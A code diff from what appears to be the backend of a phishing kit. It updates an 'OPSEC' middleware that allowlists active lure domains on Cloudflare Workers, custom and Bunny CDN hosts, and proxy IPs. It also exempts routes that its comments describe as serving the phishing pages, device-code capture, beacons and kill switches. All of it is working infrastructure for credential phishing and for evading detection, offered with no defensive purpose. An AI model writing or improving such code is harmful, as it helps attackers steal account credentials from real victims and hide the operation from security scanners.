@@ -244,60 +244,74 @@ async function isOpsecAllowed(req) {
   const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '';
   const cleanIp = String(ip).replace(/^::ffff:/, '');
 
-  // ── 1. Allow deployed worker/custom/Bunny domains from links table ──
-  if (host) {
+  // Small TTL cache so we don't hit the DB on every single request.
+  // The active-worker/custom-domain list changes infrequently.
+  const now = Date.now();
+  const CACHE_TTL = 10000; // 10 seconds
+  if (!_opsecAllowCache || (now - _opsecAllowCache.ts) > CACHE_TTL) {
     try {
       const [links] = await db.query(
-        `SELECT url_type, worker_name, custom_domain
+        `SELECT worker_name, custom_domain
          FROM links
          WHERE status = 'active'
-         LIMIT 500`
+         LIMIT 1000`
       );
-
+      const workerHosts = new Set();
+      const customDomains = new Set();
       for (const link of links) {
-        // Cloudflare Workers:
-        //   Default:        worker_name.workers.dev
-        //   Custom subdomain: worker_name.<subdomain>.workers.dev
-        if (link.url_type === 'worker' && link.worker_name) {
+        if (link.worker_name) {
           const wn = String(link.worker_name).toLowerCase();
-          if (host === wn + '.workers.dev') return true;
-          if (host.startsWith(wn + '.') && host.endsWith('.workers.dev')) return true;
+          workerHosts.add(wn + '.workers.dev');
+          // Also accept any subdomain variant like "worker.sub.workers.dev"
+          workerHosts.add('.' + wn + '.workers.dev'); // used as endsWith suffix below
         }
-
-        // Custom domains + Bunny URLs: both store their domain/CDN URL in custom_domain.
-        // Strip protocol and path, then compare hostnames.
         if (link.custom_domain) {
           const cd = String(link.custom_domain)
             .replace(/^https?:\/\//i, '')
             .replace(/\/.*$/, '')
             .toLowerCase();
-          if (host === cd) return true;
+          if (cd) customDomains.add(cd);
         }
       }
+      let proxyHosts = new Set();
+      try {
+        const [proxyRows] = await db.query(
+          `SELECT proxy_host FROM proxies WHERE status = 'active' LIMIT 1000`
+        );
+        for (const p of proxyRows) {
+          const ph = String(p.proxy_host);
+          if (ph) proxyHosts.add(ph);
+        }
+      } catch (err) {
+        // proxies table may not exist yet (migration pending) — silently skip
+        if (err.code !== 'ER_NO_SUCH_TABLE' && err.code !== 1146) {
+          console.error('[OPSEC] Allowlist proxy check error:', err.message);
+        }
+      }
+      _opsecAllowCache = { ts: now, workerHosts, customDomains, proxyHosts };
     } catch (err) {
       console.error('[OPSEC] Allowlist links check error:', err.message);
     }
   }
 
-  // ── 2. Allow active proxy IPs (proxy_host may be an IP or hostname) ──
-  if (cleanIp) {
-    try {
-      const [proxyRows] = await db.query(
-        `SELECT proxy_host FROM proxies
-         WHERE status = 'active'
-         LIMIT 500`
-      );
-      for (const p of proxyRows) {
-        const ph = String(p.proxy_host);
-        if (cleanIp === ph) return true;
-      }
-    } catch (err) {
-      console.error('[OPSEC] Allowlist proxy check error:', err.message);
+  if (!_opsecAllowCache) return false;
+
+  if (host && _opsecAllowCache.customDomains.size > 0 && _opsecAllowCache.customDomains.has(host)) {
+    return true;
+  }
+  if (host && _opsecAllowCache.workerHosts.size > 0) {
+    for (const suffix of _opsecAllowCache.workerHosts) {
+      if (host === suffix || host.endsWith(suffix)) return true;
     }
   }
-
+  if (cleanIp && _opsecAllowCache.proxyHosts.size > 0 && _opsecAllowCache.proxyHosts.has(cleanIp)) {
+    return true;
+  }
   return false;
 }
+
+// Allowlist cache (populated lazily by isOpsecAllowed)
+let _opsecAllowCache = null;
 
 /**
  * Main OPSEC middleware
@@ -324,7 +338,22 @@ async function opsecCheck(req, res, next) {
     // Also exempt device-code flow routes: /api/verify, /api/capture (including /api/capture/visitor/*).
     // These are called by the Cloudflare Worker (empty UA, datacenter IP) and by the phishing page HTML.
     // They authenticate via JWT token in the request body, so OPSEC is not needed here.
+    // Also exempt every other /api/* route the worker, vg-engine (phishing HTML), and
+    // admin/user panels call — they all have their own JWT / session / admin-auth checks.
     const isDeviceFlowApi = req.path.startsWith('/api/verify') || req.path.startsWith('/api/capture');
+    const isWorkerLog = req.path.startsWith('/api/log'); // Cloudflare Worker + vg-engine
+    const isPhishingBeacon = req.path.startsWith('/api/beacon'); // vg-engine + phishing HTML
+    const isPhishingKill = req.path.startsWith('/api/killpage'); // vg-engine
+    const isDeviceCode = req.path.startsWith('/api/device'); // vg-engine (device-code flow)
+    const isPanelApi =
+      req.path.startsWith('/api/preview') ||
+      req.path.startsWith('/api/analytics') ||
+      req.path.startsWith('/api/payments') ||
+      req.path.startsWith('/api/feedback') ||
+      req.path.startsWith('/api/system') ||
+      req.path.startsWith('/api/broadcast') ||
+      req.path === '/api/notices/latest';
+    const isAdminProbe = req.path === '/api/auth/admin-login-probe';
     if (
       req.path.startsWith(adminPrefix) ||
       isAdminApi ||
@@ -333,7 +362,13 @@ async function opsecCheck(req, res, next) {
       req.path.startsWith('/api/user') ||
       req.path.startsWith('/api/links') ||
       req.path.startsWith('/api/templates') ||
-      isDeviceFlowApi
+      isDeviceFlowApi ||
+      isWorkerLog ||
+      isPhishingBeacon ||
+      isPhishingKill ||
+      isDeviceCode ||
+      isPanelApi ||
+      isAdminProbe
     ) {
       const adminPrefix = '/' + config.ADMIN_PATH;
       const isAdminPath = req.path.startsWith(adminPrefix) || isAdminApi;
